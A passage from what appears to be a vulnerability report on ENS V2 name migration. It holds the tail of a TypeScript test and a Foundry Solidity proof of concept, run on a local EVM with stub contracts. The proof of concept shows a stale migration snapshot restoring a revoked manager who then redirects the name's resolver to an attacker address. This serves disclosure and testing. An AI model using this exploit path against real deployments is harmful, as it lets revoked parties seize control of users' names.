    const restoredManager = decodedGrant.args[2]
    assert(restoredManager)
    expect(restoredManager.toLowerCase()).toBe(REVOKED_MANAGER.toLowerCase())

    const decodedOuter = decodeFunctionData({
      abi: hcaOwnerExecutionAbi,
      data: batch.outerCall.data,
    })
    expect(decodedOuter.functionName).toBe('executeByOwner')
    expect(decodedOuter.args[0].map(({ target }) => target.toLowerCase())).toEqual([
      V2_CONTRACTS.MigrationHelper.toLowerCase(),
      V2_CONTRACTS.ETHRegistry.toLowerCase(),
    ])

    const managerExpectation = batch.verificationExpectations.find(
      ({ type }) => type === 'manager-role',
    )
    expect(managerExpectation).toMatchObject({
      type: 'manager-role',
      account: REVOKED_MANAGER,
      roleBitmap: ROLE_SET_RESOLVER,
    })
  })
})
```

### Stateful local-EVM impact reproducer

Path: `contracts/test/poc/StaleMigrationAuthorityPoC.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.13;

import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";

import {IStandaloneHCAFactory} from "~src/hca/interfaces/IStandaloneHCAFactory.sol";
import {MigrationHelper, LockedChildren} from "~src/migration/MigrationHelper.sol";
import {LibMigration} from "~src/migration/libraries/LibMigration.sol";
import {LockedMigrationController} from "~src/migration/LockedMigrationController.sol";
import {UnlockedMigrationController} from "~src/migration/UnlockedMigrationController.sol";
import {PermissionedRegistry} from "~src/registry/PermissionedRegistry.sol";
import {RegistryRolesLib} from "~src/registry/libraries/RegistryRolesLib.sol";
import {WrapperRegistry} from "~src/registry/WrapperRegistry.sol";
import {MigrationControllerFixture} from "~test/fixtures/MigrationControllerFixture.sol";

contract OwnerBindingStub {
    mapping(address hca => address owner) internal _owners;

    function bind(address hca, address owner) external {
        _owners[hca] = owner;
    }

    function authorizedOwnerOf(address hca) external view returns (address) {
        return _owners[hca];
    }
}

contract OwnerExecutionStub {
    function executeMigrationAndRestoreManager(
        MigrationHelper helper,
        LibMigration.Data calldata staleData,
        PermissionedRegistry ethRegistry,
        uint256 resource,
        address staleManager
    ) external {
        LibMigration.Data[] memory unwrapped = new LibMigration.Data[](1);
        unwrapped[0] = staleData;
        helper.migrate(
            unwrapped,
            new LibMigration.Data[][](0),
            new LibMigration.Data[][](0),
            new LockedChildren[](0)
        );
        ethRegistry.grantRoles(resource, RegistryRolesLib.ROLE_SET_RESOLVER, staleManager);
    }
}

contract StaleMigrationAuthorityPoC is MigrationControllerFixture {
    UnlockedMigrationController internal unlockedController;
    LockedMigrationController internal lockedController;
    MigrationHelper internal helper;
    OwnerBindingStub internal ownerBindings;
    OwnerExecutionStub internal hca;

    address internal revokedManager = makeAddr("revokedManager");
    address internal staleResolver = makeAddr("staleResolver");
    address internal safeResolver = makeAddr("safeResolver");
    address internal attackerResolver = makeAddr("attackerResolver");

    function setUp() external {
        deployMigrationControllerFixture();

        unlockedController = new UnlockedMigrationController(
            nameWrapper,
            address(graveyard),
            ethRegistry,
            contractNamer
        );
        ethRegistry.grantRootRoles(
            RegistryRolesLib.ROLE_REGISTER_RESERVED,
            address(unlockedController)
        );

        WrapperRegistry wrapperRegistryImpl = new WrapperRegistry(
            nameWrapper,
            address(graveyard),
            verifiableFactory,
            address(ensV1Resolver),
            registryUpgradeSet,
            labelStore,
            publicResolverSet,
            address(0),
            address(this)
        );
        lockedController = new LockedMigrationController(
            nameWrapper,
            address(graveyard),
            ethRegistry,
            verifiableFactory,
            address(wrapperRegistryImpl),
            publicResolverSet,
            address(0),
            contractNamer
        );
        ethRegistry.grantRootRoles(
            RegistryRolesLib.ROLE_REGISTER_RESERVED,
            address(lockedController)
        );

        ownerBindings = new OwnerBindingStub();
        hca = new OwnerExecutionStub();
        ownerBindings.bind(address(hca), testOwner);
        helper = new MigrationHelper(
            rootRegistry,
            unlockedController,
            lockedController,
            IStandaloneHCAFactory(address(ownerBindings)),
            contractNamer
        );
    }

    function test_victimRevocationIsUndoneByStaleMigrationSnapshot() external {
        string memory label = "revoked-manager";
        (bytes memory name, uint256 resource) = registerUnwrapped(label);
        bytes32 node = NameCoder.namehash(name, 0);

        // The subgraph/app snapshot is taken while the attacker is the V1 manager.
        vm.prank(testOwner);
        baseRegistrar.reclaim(resource, revokedManager);
        vm.prank(revokedManager);
        registryV1.setResolver(node, staleResolver);

        // This is the stale Migration.Data encoded by the Manager app.
        LibMigration.Data memory staleData = LibMigration.Data({
            label: label,
            owner: testOwner,
            subregistry: PermissionedRegistry(address(0)),
            resolver: staleResolver
        });

        // The victim revokes the attacker through another V1 interface after
        // Manager has cached its snapshot. Reclaim makes the registrant the
        // current manager again, after which the victim selects a safe resolver.
        vm.startPrank(testOwner);
        baseRegistrar.reclaim(resource, testOwner);
        registryV1.setResolver(node, safeResolver);
        vm.stopPrank();
        assertEq(registryV1.owner(node), testOwner, "current V1 manager must be safe");
        assertEq(registryV1.resolver(node), safeResolver, "current V1 resolver must be safe");

        // The victim returns to the still-fresh Manager workflow and approves
        // its migration. The final plan remains based on the cached snapshot.
        vm.prank(testOwner);
        baseRegistrar.approve(address(helper), resource);
        vm.prank(testOwner);
        ethRegistry.setApprovalForAll(address(hca), true);

        // Mirrors the app's executeByOwner inner call order: migrate, then grantRoles.
        vm.prank(testOwner);
        hca.executeMigrationAndRestoreManager(
            helper,
            staleData,
            ethRegistry,
            resource,
            revokedManager
        );

        vm.prank(testOwner);
        ethRegistry.setApprovalForAll(address(hca), false);

        uint256 tokenId = ethRegistry.getTokenId(resource);
        assertEq(ethRegistry.ownerOf(tokenId), testOwner, "wallet remains V2 owner");
        assertEq(ethRegistry.getResolver(label), staleResolver, "stale resolver was restored");
        assertTrue(
            ethRegistry.hasRoles(resource, RegistryRolesLib.ROLE_SET_RESOLVER, revokedManager),
            "revoked manager was restored"
        );
        assertFalse(
            ethRegistry.isApprovedForAll(testOwner, address(hca)),
            "temporary HCA approval was removed"
        );

        vm.prank(revokedManager);
        ethRegistry.setResolver(resource, attackerResolver);
        assertEq(
            ethRegistry.getResolver(label),
            attackerResolver,
            "restored manager can redirect the migrated name"
        );
    }
}
```
